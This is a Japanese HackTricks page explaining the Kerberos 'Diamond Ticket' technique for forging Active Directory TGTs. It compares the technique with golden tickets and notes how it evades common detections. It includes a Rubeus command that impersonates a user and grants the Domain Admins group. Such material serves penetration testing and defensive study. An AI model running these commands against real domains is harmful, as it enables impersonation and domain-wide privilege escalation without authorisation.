# ダイヤモンドチケット

{{#include ../../banners/hacktricks-training.md}}

## ダイヤモンドチケット

**ゴールデンチケットのように**、ダイヤモンドチケットは**任意のユーザーとして任意のサービスにアクセスするために使用できるTGT**です。ゴールデンチケットは完全にオフラインで偽造され、そのドメインのkrbtgtハッシュで暗号化され、使用のためにログオンセッションに渡されます。ドメインコントローラーは、正当に発行されたTGTを追跡しないため、独自のkrbtgtハッシュで暗号化されたTGTを喜んで受け入れます。

ゴールデンチケットの使用を検出するための一般的な2つの技術があります：

- 対応するAS-REQがないTGS-REQを探します。
- Mimikatzのデフォルトの10年の有効期限のような、ばかげた値を持つTGTを探します。

**ダイヤモンドチケット**は、**DCによって発行された正当なTGTのフィールドを変更することによって作成されます**。これは、**TGTを要求し**、ドメインのkrbtgtハッシュで**復号化し**、チケットの希望するフィールドを**変更し**、その後**再暗号化する**ことによって達成されます。これは、ゴールデンチケットの前述の2つの欠点を**克服します**：

- TGS-REQには前にAS-REQがあります。
- TGTはDCによって発行されたため、ドメインのKerberosポリシーからのすべての正しい詳細を持っています。これらはゴールデンチケットで正確に偽造できますが、より複雑でミスが起こりやすいです。
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{{#include ../../banners/hacktricks-training.md}}
